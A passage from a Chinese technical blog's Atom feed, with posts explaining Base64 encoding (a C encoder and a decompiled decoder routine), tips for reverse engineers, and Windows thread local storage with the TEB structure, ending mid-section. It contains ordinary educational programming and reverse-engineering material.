    <content type="html"><![CDATA[<h1 id="总括："><a href="#总括：" class="headerlink" title="总括："></a>总括：</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>本篇文章主要介绍关于Base64的加密原理，加密函数，及其应用。</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>Base64编码，是我们程序开发中经常使用到的编码方法。它是一种基于用64个可打印字符来表示二进制数据的表示方法。它其实只是定义用可打印字符传输内容一种方法，并不会产生新的字符集。</strong><br><a id="more"></a><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;参考博客主要有:<br><a href="http://blog.csdn.net/aozeahj/article/details/52507352" target="_blank" rel="external">http://blog.csdn.net/aozeahj/article/details/52507352</a><br><a href="https://www.cnblogs.com/yejianfei/archive/2013/04/06/3002838.html" target="_blank" rel="external">https://www.cnblogs.com/yejianfei/archive/2013/04/06/3002838.html</a></p><h1 id="Base64的加密原理："><a href="#Base64的加密原理：" class="headerlink" title="Base64的加密原理："></a>Base64的加密原理：</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，我们取字符0-9，A-Z,a-z，以及”+”和”/“组成一个63个不同的字符集。分别对这64个字符做好编号，对应的索引如下：<br>    <img src="https://i.imgur.com/1iUqXjk.png" alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先我们按照如上的编号，写出一个8位二进制的数据，然后把它分成一个6位二进制的分组。再按照编号组成一个新的字符。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以上是一个一般情况。我们找出一个编码和译码的最优情况：首先，一个字符进行编码成一个8位二进制的数据。然后进行译码要把这8位二进制组成6位二进制，但是这势必会造成2位二进制数据的丢失，我们取8和6的最小公倍数即24的整数倍就不会造成数据位的丢失情况。如下图：<br>    <img src="https://i.imgur.com/3nDyh9t.png" alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是我们无法保证每个字符串都能保证24的整数倍的<strong>位长度</strong>，在编码的时候很有可能无法凑够6位数字，但是Base64已经替我们想到了解决方案，即使用凑0的方案，不够6的整数倍的数据补0。但是不够24的数据使用“=”即可。这就是我们进行编码的时候，有时候在结尾出现1个”=”或者2个”=”的情况。<br>    <img src="https://i.imgur.com/0bVoKk2.png" alt=""></p><h1 id="Base64的加密函数："><a href="#Base64的加密函数：" class="headerlink" title="Base64的加密函数："></a>Base64的加密函数：</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">char</span> *<span class="title">base64_encode</span><span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> * bindata, <span class="keyword">char</span> * base64, <span class="keyword">int</span> binlength )</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">int</span> i, j;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> current;</div><div class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>, j = <span class="number">0</span> ; i &lt; binlength ; i += <span class="number">3</span> )</div><div class="line">    &#123;</div><div class="line">        current = (bindata[i] &gt;&gt; <span class="number">2</span>) ;</div><div class="line">        current &amp;= (<span class="keyword">unsigned</span> <span class="keyword">char</span>)<span class="number">0x3F</span>;</div><div class="line">        base64[j++] = base64char[(<span class="keyword">int</span>)current];</div><div class="line">        current = ( (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(bindata[i] &lt;&lt; <span class="number">4</span> ) ) &amp; ( (<span class="keyword">unsigned</span> <span class="keyword">char</span>)<span class="number">0x30</span> ) ;   <span class="comment">//特征：左移4位</span></div><div class="line">        <span class="keyword">if</span> ( i + <span class="number">1</span> &gt;= binlength )</div><div class="line">        &#123;</div><div class="line">            base64[j++] = base64char[(<span class="keyword">int</span>)current];</div><div class="line">            base64[j++] = <span class="string">'='</span>;</div><div class="line">            base64[j++] = <span class="string">'='</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">        current |= ( (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(bindata[i+<span class="number">1</span>] &gt;&gt; <span class="number">4</span>) ) &amp; ( (<span class="keyword">unsigned</span> <span class="keyword">char</span>) <span class="number">0x0F</span> );  <span class="comment">//特征：右移4位</span></div><div class="line">        base64[j++] = base64char[(<span class="keyword">int</span>)current];</div><div class="line">        current = ( (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(bindata[i+<span class="number">1</span>] &lt;&lt; <span class="number">2</span>) ) &amp; ( (<span class="keyword">unsigned</span> <span class="keyword">char</span>) <span class="number">0x3C</span> ) ;   <span class="comment">//特征：左移2位</span></div><div class="line">        <span class="keyword">if</span> ( i + <span class="number">2</span> &gt;= binlength )</div><div class="line">        &#123;</div><div class="line">            base64[j++] = base64char[(<span class="keyword">int</span>)current];</div><div class="line">            base64[j++] = <span class="string">'='</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">        current |= ( (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(bindata[i+<span class="number">2</span>] &gt;&gt; <span class="number">6</span>) ) &amp; ( (<span class="keyword">unsigned</span> <span class="keyword">char</span>) <span class="number">0x03</span> );    <span class="comment">//特征：左移6位</span></div><div class="line">        base64[j++] = base64char[(<span class="keyword">int</span>)current];</div><div class="line">        current = ( (<span class="keyword">unsigned</span> <span class="keyword">char</span>)bindata[i+<span class="number">2</span>] ) &amp; ( (<span class="keyword">unsigned</span> <span class="keyword">char</span>)<span class="number">0x3F</span> ) ;</div><div class="line">        base64[j++] = base64char[(<span class="keyword">int</span>)current];</div><div class="line">    &#125;</div><div class="line">    base64[j] = <span class="string">'\0'</span>;</div><div class="line">    <span class="keyword">return</span> base64;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h1 id="Base64的识别："><a href="#Base64的识别：" class="headerlink" title="Base64的识别："></a>Base64的识别：</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#DC143C"><strong>根据加密算法，他的特征是出现左/右移2位，4位，6位.</strong></font><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在逆向中，我们逆向一个Base64的加密函数如下：<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">int</span> __cdecl <span class="keyword">sub_434990(int </span><span class="built_in">a1</span>, unsigned int <span class="built_in">a2</span>, int <span class="built_in">a3</span>)</div><div class="line">&#123;</div><div class="line">  int <span class="built_in">v3</span><span class="comment">; // eax@5</span></div><div class="line">  unsigned int <span class="built_in">v5</span><span class="comment">; // [sp+Ch] [bp-100h]@1</span></div><div class="line">  unsigned int <span class="built_in">v6</span><span class="comment">; // [sp+D4h] [bp-38h]@4</span></div><div class="line">  unsigned int <span class="built_in">v7</span><span class="comment">; // [sp+E0h] [bp-2Ch]@8</span></div><div class="line">  int <span class="built_in">v8</span><span class="comment">; // [sp+ECh] [bp-20h]@1</span></div><div class="line">  int v9<span class="comment">; // [sp+F8h] [bp-14h]@1</span></div><div class="line">  unsigned int i<span class="comment">; // [sp+104h] [bp-8h]@1</span></div><div class="line">  memset(&amp;<span class="built_in">v5</span>, <span class="number">0xCC</span>u, <span class="number">0x100</span>u)<span class="comment">;</span></div><div class="line">  <span class="built_in">v8</span> = <span class="number">0</span><span class="comment">;</span></div><div class="line">  v9 = <span class="number">0</span><span class="comment">;</span></div><div class="line">  for ( i = <span class="number">0</span><span class="comment">; i &lt; a2; ++i )</span></div><div class="line">  &#123;</div><div class="line">    <span class="built_in">v6</span> = i % <span class="number">4</span><span class="comment">;</span></div><div class="line">    <span class="meta">if</span> ( *(_BYTE *)(i + <span class="built_in">a1</span>) == <span class="number">61</span> )</div><div class="line">    &#123;</div><div class="line">      <span class="built_in">v3</span> = <span class="number">0</span><span class="comment">;</span></div><div class="line">      return fun_ResultIsV2(<span class="number">1</span>, <span class="built_in">v3</span>)<span class="comment">;</span></div><div class="line">    &#125;</div><div class="line">    <span class="meta">if</span> ( (signed int)*(_BYTE *)(i + <span class="built_in">a1</span>) &lt; <span class="number">43</span></div><div class="line">      <span class="title">||</span> (signed int)*(_BYTE *)(i + <span class="built_in">a1</span>) &gt; <span class="number">122</span></div><div class="line">      <span class="title">||</span> (<span class="built_in">v7</span> = <span class="keyword">byte_48B0FD[*(_BYTE </span>*)(i + <span class="built_in">a1</span>)], <span class="built_in">v7</span> == -<span class="number">1</span>) )</div><div class="line">    &#123;</div><div class="line">      <span class="built_in">v3</span> = <span class="number">1</span><span class="comment">;</span></div><div class="line">      return fun_ResultIsV2(<span class="number">1</span>, <span class="built_in">v3</span>)<span class="comment">;</span></div><div class="line">    &#125;</div><div class="line">    <span class="built_in">v5</span> = <span class="built_in">v6</span><span class="comment">;</span></div><div class="line">    <span class="keyword">switch </span>( <span class="built_in">v6</span> )</div><div class="line">    &#123;</div><div class="line">      case <span class="number">0</span>u:</div><div class="line">        *(_BYTE *)(v9 + <span class="built_in">a3</span>) = <span class="number">4</span> * <span class="built_in">v7</span><span class="comment">;</span></div><div class="line">        <span class="built_in">v8</span> = <span class="number">0</span><span class="comment">;</span></div><div class="line">        <span class="built_in">v8</span> = <span class="keyword">sub_42D681();</span></div><div class="line"><span class="keyword"> </span>       <span class="meta">if</span> ( <span class="built_in">v8</span> == <span class="number">1</span> )</div><div class="line">          <span class="keyword">sub_42E086();</span></div><div class="line"><span class="keyword"> </span>       <span class="built_in">v8</span> = <span class="number">0</span><span class="comment">;</span></div><div class="line">        <span class="built_in">v8</span> = <span class="keyword">sub_42E26B();</span></div><div class="line"><span class="keyword"> </span>       <span class="meta">if</span> ( <span class="built_in">v8</span> == <span class="number">1</span> )</div><div class="line">          <span class="keyword">sub_42E086();</span></div><div class="line"><span class="keyword"> </span>       <span class="built_in">v8</span> = <span class="number">0</span><span class="comment">;</span></div><div class="line">        <span class="built_in">v8</span> = <span class="keyword">sub_42D7F8();</span></div><div class="line"><span class="keyword"> </span>       <span class="meta">if</span> ( <span class="built_in">v8</span> == <span class="number">1</span> )</div><div class="line">          <span class="keyword">sub_42E086();</span></div><div class="line"><span class="keyword"> </span>       <span class="keyword">break;</span></div><div class="line"><span class="keyword"> </span>     case <span class="number">1</span>u:</div><div class="line">        *(_BYTE *)(v9++ + <span class="built_in">a3</span>) += (<span class="built_in">v7</span> &gt;&gt; <span class="number">4</span>) &amp; <span class="number">3</span><span class="comment">;</span></div><div class="line">        <span class="meta">if</span> ( i &lt; <span class="built_in">a2</span> - <span class="number">3</span> <span class="title">||</span> *(_BYTE *)(<span class="built_in">a2</span> + <span class="built_in">a1</span> - <span class="number">2</span>) != <span class="number">61</span> )</div><div class="line">          *(_BYTE *)(v9 + <span class="built_in">a3</span>) = <span class="number">16</span> * (<span class="built_in">v7</span> &amp; <span class="number">0xF</span>)<span class="comment">;</span></div><div class="line">        <span class="keyword">break;</span></div><div class="line"><span class="keyword"> </span>     case <span class="number">2</span>u:</div><div class="line">        *(_BYTE *)(v9++ + <span class="built_in">a3</span>) += (<span class="built_in">v7</span> &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0xF</span><span class="comment">;</span></div><div class="line">        <span class="built_in">v8</span> = <span class="keyword">sub_42E26B();</span></div><div class="line"><span class="keyword"> </span>       <span class="meta">if</span> ( <span class="built_in">v8</span> == <span class="number">1</span> )</div><div class="line">          <span class="keyword">sub_42E086();</span></div><div class="line"><span class="keyword"> </span>       <span class="built_in">v8</span> = <span class="number">0</span><span class="comment">;</span></div><div class="line">        <span class="built_in">v8</span> = <span class="keyword">sub_42D7F8();</span></div><div class="line"><span class="keyword"> </span>       <span class="meta">if</span> ( <span class="built_in">v8</span> == <span class="number">1</span> )</div><div class="line">          <span class="keyword">sub_42E086();</span></div><div class="line"><span class="keyword"> </span>       <span class="meta">if</span> ( i &lt; <span class="built_in">a2</span> - <span class="number">2</span> <span class="title">||</span> *(_BYTE *)(<span class="built_in">a2</span> + <span class="built_in">a1</span> - <span class="number">1</span>) != <span class="number">61</span> )</div><div class="line">          *(_BYTE *)(v9 + <span class="built_in">a3</span>) = (<span class="built_in">v7</span> &amp; <span class="number">3</span>) &lt;&lt; <span class="number">6</span><span class="comment">;</span></div><div class="line">        <span class="keyword">break;</span></div><div class="line"><span class="keyword"> </span>     case <span class="number">3</span>u:</div><div class="line">        *(_BYTE *)(v9++ + <span class="built_in">a3</span>) += <span class="built_in">v7</span><span class="comment">;</span></div><div class="line">        <span class="keyword">break;</span></div><div class="line"><span class="keyword"> </span>     default:</div><div class="line">        continue<span class="comment">;</span></div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="built_in">v3</span> = <span class="number">0</span><span class="comment">;</span></div><div class="line">  return fun_ResultIsV2(<span class="number">1</span>, <span class="built_in">v3</span>)<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关键部分如下图所示：<br>    <img src="https://i.imgur.com/UKAgFfp.png" alt=""><br>    <img src="https://i.imgur.com/cqSI9u4.png" alt=""><br>    <img src="https://i.imgur.com/KHIWLiQ.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;总括：&quot;&gt;&lt;a href=&quot;#总括：&quot; class=&quot;headerlink&quot; title=&quot;总括：&quot;&gt;&lt;/a&gt;总括：&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;strong&gt;本篇文章主要介绍关于Base64的加密原理，加密函数，及其应用。&lt;/strong&gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;strong&gt;Base64编码，是我们程序开发中经常使用到的编码方法。它是一种基于用64个可打印字符来表示二进制数据的表示方法。它其实只是定义用可打印字符传输内容一种方法，并不会产生新的字符集。&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="密码学" scheme="http://yoursite.com/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
  </entry>
  
  <entry>
    <title>给逆向工作者的忠告</title>
    <link href="http://yoursite.com/2017/12/09/%E7%BB%99%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E4%BA%BA%E5%91%98%E7%9A%84%E5%BF%A0%E5%91%8A/"/>
    <id>http://yoursite.com/2017/12/09/给逆向分析人员的忠告/</id>
    <published>2017-12-09T09:02:11.000Z</published>
    <updated>2017-12-09T09:50:30.586Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-首先使用行为分析工具，对需要逆向的程序进行行为分析，这个能把握程序的总体运行特征。"><a href="#1-首先使用行为分析工具，对需要逆向的程序进行行为分析，这个能把握程序的总体运行特征。" class="headerlink" title="1.首先使用行为分析工具，对需要逆向的程序进行行为分析，这个能把握程序的总体运行特征。"></a>1.首先使用行为分析工具，对需要逆向的程序进行行为分析，这个能把握程序的总体运行特征。</h1><h1 id="2-使用静态和动态结合的分析思路。"><a href="#2-使用静态和动态结合的分析思路。" class="headerlink" title="2.使用静态和动态结合的分析思路。"></a>2.使用静态和动态结合的分析思路。</h1><h1 id="3-不要完全依赖于反编译器，因为程序很可能采用反调试和混淆技术，干扰其判断。"><a href="#3-不要完全依赖于反编译器，因为程序很可能采用反调试和混淆技术，干扰其判断。" class="headerlink" title="3.不要完全依赖于反编译器，因为程序很可能采用反调试和混淆技术，干扰其判断。"></a>3.不要完全依赖于反编译器，因为程序很可能采用反调试和混淆技术，干扰其判断。</h1><h1 id="4-合理使用F5大法，因为他会把一个简单的问题复杂化，简单点。"><a href="#4-合理使用F5大法，因为他会把一个简单的问题复杂化，简单点。" class="headerlink" title="4.合理使用F5大法，因为他会把一个简单的问题复杂化，简单点。"></a>4.合理使用F5大法，因为他会把一个简单的问题复杂化，简单点。</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2017年12月9日</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;1-首先使用行为分析工具，对需要逆向的程序进行行为分析，这个能把握程序的总体运行特征。&quot;&gt;&lt;a href=&quot;#1-首先使用行为分析工具，对需要逆向的程序进行行为分析，这个能把握程序的总体运行特征。&quot; class=&quot;headerlink&quot; title=&quot;1.首先使用
      
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>线程局部存储技术</title>
    <link href="http://yoursite.com/2017/12/02/%E7%BA%BF%E7%A8%8B%E5%B1%80%E9%83%A8%E5%AD%98%E5%82%A8%E6%8A%80%E6%9C%AF/"/>
    <id>http://yoursite.com/2017/12/02/线程局部存储技术/</id>
    <published>2017-12-02T05:45:11.000Z</published>
    <updated>2017-12-03T04:28:54.757Z</updated>
    
    <content type="html"><![CDATA[<h1 id="线程局部存储技术："><a href="#线程局部存储技术：" class="headerlink" title="线程局部存储技术："></a>线程局部存储技术：</h1><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;线程局部存储技术（Thread Local Storage）很好的解决了多线程程序设计中变量的同步问题。同时，TLS回调函数也适用于<font color="#DC143C">反调试技术</font>。使用TSL技术，可以让进程拥有同一个全局变量，但是在不同的线程却对应着不同的值，这些变量只是对应特定的线程才是有意义的</strong></p><h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><h1 id="两个前提知识："><a href="#两个前提知识：" class="headerlink" title="两个前提知识："></a>两个前提知识：</h1><h2 id="线程环境块（TEB）："><a href="#线程环境块（TEB）：" class="headerlink" title="线程环境块（TEB）："></a>线程环境块（TEB）：</h2><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TEB指的是线程环境块，该结构体里面包含一个线程的基本信息，进程的每一个线程都对应的一个这样的TEB数据结构。</strong></p><h3 id="TEB的数据结构："><a href="#TEB的数据结构：" class="headerlink" title="TEB的数据结构："></a>TEB的数据结构：</h3><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div></pre></td><td class="code"><pre><div class="line">typedef struct _TEB</div><div class="line">&#123;</div><div class="line">    NT_TIB Tib;                             <span class="comment">/* 00h */</span></div><div class="line">    PVOID EnvironmentPointer;               <span class="comment">/* 1Ch */</span></div><div class="line">    CLIENT_ID Cid;                          <span class="comment">/* 20h */</span></div><div class="line">    PVOID ActiveRpcHandle;                  <span class="comment">/* 28h */</span></div><div class="line">    PVOID ThreadLocalStoragePointer;        <span class="comment">/* 2Ch */</span></div><div class="line">    struct _PEB *ProcessEnvironmentBlock;   <span class="comment">/* 30h */</span></div><div class="line">    <span class="keyword">ULONG</span> LastErrorValue;                   <span class="comment">/* 34h */</span></div><div class="line">    <span class="keyword">ULONG</span> CountOfOwnedCriticalSections;     <span class="comment">/* 38h */</span></div><div class="line">    PVOID CsrClientThread;                  <span class="comment">/* 3Ch */</span></div><div class="line">    struct _W32THREAD* Win32ThreadInfo;     <span class="comment">/* 40h */</span></div><div class="line">    <span class="keyword">ULONG</span> User32Reserved[<span class="number">0x1A</span>];             <span class="comment">/* 44h */</span></div><div class="line">    <span class="keyword">ULONG</span> UserReserved[<span class="number">5</span>];                  <span class="comment">/* ACh */</span></div><div class="line">    PVOID WOW32Reserved;                    <span class="comment">/* C0h */</span></div><div class="line">    LCID CurrentLocale;                     <span class="comment">/* C4h */</span></div><div class="line">    <span class="keyword">ULONG</span> FpSoftwareStatusRegister;         <span class="comment">/* C8h */</span></div><div class="line">    PVOID SystemReserved1[<span class="number">0x36</span>];            <span class="comment">/* CCh */</span></div><div class="line">    <span class="keyword">LONG</span> ExceptionCode;                     <span class="comment">/* 1A4h */</span></div><div class="line">    struct _ACTIVATION_CONTEXT_STACK *ActivationContextStackPointer; <span class="comment">/* 1A8h */</span></div><div class="line">    <span class="keyword">UCHAR</span> SpareBytes1[<span class="number">0x28</span>];                <span class="comment">/* 1ACh */</span></div><div class="line">    GDI_TEB_BATCH GdiTebBatch;              <span class="comment">/* 1D4h */</span></div><div class="line">    CLIENT_ID RealClientId;                 <span class="comment">/* 6B4h */</span></div><div class="line">    PVOID GdiCachedProcessHandle;           <span class="comment">/* 6BCh */</span></div><div class="line">    <span class="keyword">ULONG</span> GdiClientPID;                     <span class="comment">/* 6C0h */</span></div><div class="line">    <span class="keyword">ULONG</span> GdiClientTID;                     <span class="comment">/* 6C4h */</span></div><div class="line">    PVOID GdiThreadLocalInfo;               <span class="comment">/* 6C8h */</span></div><div class="line">    <span class="keyword">ULONG</span> Win32ClientInfo[<span class="number">62</span>];              <span class="comment">/* 6CCh */</span></div><div class="line">    PVOID glDispatchTable[<span class="number">0xE9</span>];            <span class="comment">/* 7C4h */</span></div><div class="line">    <span class="keyword">ULONG</span> glReserved1[<span class="number">0x1D</span>];                <span class="comment">/* B68h */</span></div><div class="line">    PVOID glReserved2;                      <span class="comment">/* BDCh */</span></div><div class="line">    PVOID glSectionInfo;                    <span class="comment">/* BE0h */</span></div><div class="line">    PVOID glSection;                        <span class="comment">/* BE4h */</span></div><div class="line">    PVOID glTable;                          <span class="comment">/* BE8h */</span></div><div class="line">    PVOID glCurrentRC;                      <span class="comment">/* BECh */</span></div><div class="line">    PVOID glContext;                        <span class="comment">/* BF0h */</span></div><div class="line">    NTSTATUS LastStatusValue;               <span class="comment">/* BF4h */</span></div><div class="line">    UNICODE_STRING StaticUnicodeString;     <span class="comment">/* BF8h */</span></div><div class="line">    WCHAR StaticUnicodeBuffer[<span class="number">0x105</span>];       <span class="comment">/* C00h */</span></div><div class="line">    PVOID DeallocationStack;                <span class="comment">/* E0Ch */</span></div><div class="line">    PVOID TlsSlots[<span class="number">0x40</span>];                   <span class="comment">/* E10h */</span></div><div class="line">    LIST_ENTRY TlsLinks;                    <span class="comment">/* F10h */</span></div><div class="line">    PVOID Vdm;                              <span class="comment">/* F18h */</span></div><div class="line">    PVOID ReservedForNtRpc;                 <span class="comment">/* F1Ch */</span></div><div class="line">    PVOID DbgSsReserved[<span class="number">0x2</span>];               <span class="comment">/* F20h */</span></div><div class="line">    <span class="keyword">ULONG</span> HardErrorDisabled;                <span class="comment">/* F28h */</span></div><div class="line">    PVOID Instrumentation[<span class="number">14</span>];              <span class="comment">/* F2Ch */</span></div><div class="line">    PVOID SubProcessTag;                    <span class="comment">/* F64h */</span></div><div class="line">    PVOID EtwTraceData;                     <span class="comment">/* F68h */</span></div><div class="line">    PVOID WinSockData;                      <span class="comment">/* F6Ch */</span></div><div class="line">    <span class="keyword">ULONG</span> GdiBatchCount;                    <span class="comment">/* F70h */</span></div><div class="line">    <span class="keyword">BOOLEAN</span> InDbgPrint;                     <span class="comment">/* F74h */</span></div><div class="line">    <span class="keyword">BOOLEAN</span> FreeStackOnTermination;         <span class="comment">/* F75h */</span></div><div class="line">    <span class="keyword">BOOLEAN</span> HasFiberData;                   <span class="comment">/* F76h */</span></div><div class="line">    <span class="keyword">UCHAR</span> IdealProcessor;                   <span class="comment">/* F77h */</span></div><div class="line">    <span class="keyword">ULONG</span> GuaranteedStackBytes;             <span class="comment">/* F78h */</span></div><div class="line">    PVOID ReservedForPerf;                  <span class="comment">/* F7Ch */</span></div><div class="line">    PVOID ReservedForOle;                   <span class="comment">/* F80h */</span></div><div class="line">    <span class="keyword">ULONG</span> WaitingOnLoaderLock;              <span class="comment">/* F84h */</span></div><div class="line">    <span class="keyword">ULONG</span> SparePointer1;                    <span class="comment">/* F88h */</span></div><div class="line">    <span class="keyword">ULONG</span> SoftPatchPtr1;                    <span class="comment">/* F8Ch */</span></div><div class="line">    <span class="keyword">ULONG</span> SoftPatchPtr2;                    <span class="comment">/* F90h */</span></div><div class="line">    PVOID *TlsExpansionSlots;               <span class="comment">/* F94h */</span></div><div class="line">    <span class="keyword">ULONG</span> ImpersionationLocale;             <span class="comment">/* F98h */</span></div><div class="line">    <span class="keyword">ULONG</span> IsImpersonating;                  <span class="comment">/* F9Ch */</span></div><div class="line">    PVOID NlsCache;                         <span class="comment">/* FA0h */</span></div><div class="line">    PVOID pShimData;                        <span class="comment">/* FA4h */</span></div><div class="line">    <span class="keyword">ULONG</span> HeapVirualAffinity;               <span class="comment">/* FA8h */</span></div><div class="line">    PVOID CurrentTransactionHandle;         <span class="comment">/* FACh */</span></div><div class="line">    PTEB_ACTIVE_FRAME ActiveFrame;          <span class="comment">/* FB0h */</span></div><div class="line">    PVOID FlsData;                          <span class="comment">/* FB4h */</span></div><div class="line">    <span class="keyword">UCHAR</span> SafeThunkCall;                    <span class="comment">/* FB8h */</span></div><div class="line">    <span class="keyword">UCHAR</span> BooleanSpare[<span class="number">3</span>];                  <span class="comment">/* FB9h */</span></div><div class="line">&#125; TEB, *PTEB;</div></pre></td></tr></table></figure><h3 id="TEB的重要成员："><a href="#TEB的重要成员：" class="headerlink" title="TEB的重要成员："></a>TEB的重要成员：</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">NT_TIB Tib;                             <span class="comment">/* 00h */</span></div><div class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">PEB</span> *<span class="title">ProcessEnvironmentBlock</span>;</span>   <span class="comment">/* 30h */</span></div></pre></td></tr></table></figure><ul><li>ProcessEnvirnmentBlock是一个指向PEB的指针。</li><li><p>TEB的第一个成员是_NT_Tib（线程信息块）的结构体。</p><ul><li><p>TIB的信息如下：</p><figure 